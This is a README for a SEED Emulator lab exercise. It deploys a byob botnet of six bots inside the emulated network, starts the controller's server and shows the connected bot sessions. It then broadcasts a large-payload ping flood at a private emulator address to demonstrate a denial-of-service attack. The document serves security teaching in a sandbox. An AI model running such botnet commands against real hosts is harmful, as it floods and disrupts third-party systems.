# Botnet

In this example, we show how to deploy a botnet inside the 
SEED Emulator. We first create a bot controller and 6 bots.
We then deploy the controller on `10.150.0.66`, and 
deploy the bots in randomly selected autonomous systems.
See the comments in the code for detailed explanation.

We have also recorded a 
[video](https://www.youtube.com/watch?v=5FYWB-b21bg&list=PLwCoMLt7WGjan54CuqeYGnJuMqA-RzQwD)
to explain the details of this example. 
We have modified the code (`botnet-base.py`) since the video was recorded,
so the code used in the video is slightly different from the code here. 


## Start the Controller

We will find the Bot controller container, and get a shell on it. 
We have customized the display names of the controller and all the bot nodes 
with a prefix `Bot-`, so they are quite easy to find. 
Once we are inside the controller, we can start the `byob` 
server. 

```
# cd /tmp/byob/byob
# python3 server.py --port 445
```

We will then wait for the bot nodes to connect to the server. We have deployed
6 bot nodes in the emulator, so we should see 6 clients. We can type the 
`sessions` command to see their information.

```
[byob @ /tmp/byob/byob]>sessions
0
  public_ip          10.151.0.73
  local_ip           10.151.0.73
  platform           linux
  mac_address        24:20:A9:70:04:9
  architecture       64
  username           user
  administrator      True
  device             721736c3959c
  owner              None
  latitude           0
  longitude          0
  uid                b4a453a1fd66f9108e23c96716455f3b
  joined             2021-08-08 14:20:01.213183
  online             True
  sessions           True
  last_online        2021-08-08 14:20:01.213259

1
  ...
```

## Launch Attacks

You can find the online manuals regarding how to use `byob`. Here, we will
just do a simple testing. We broadcast a command to all the bots, asking them
to ping `10.161.0.71` 10 times, with each ICMP packet carrying a large payload.
From the visualization map, we should clear see the attack traffic.
This demonstrates a denial-of-service attack. 

```
[byob @ /tmp/byob/byob]>broadcast ping -c 10 -s 5000 10.161.0.71
```

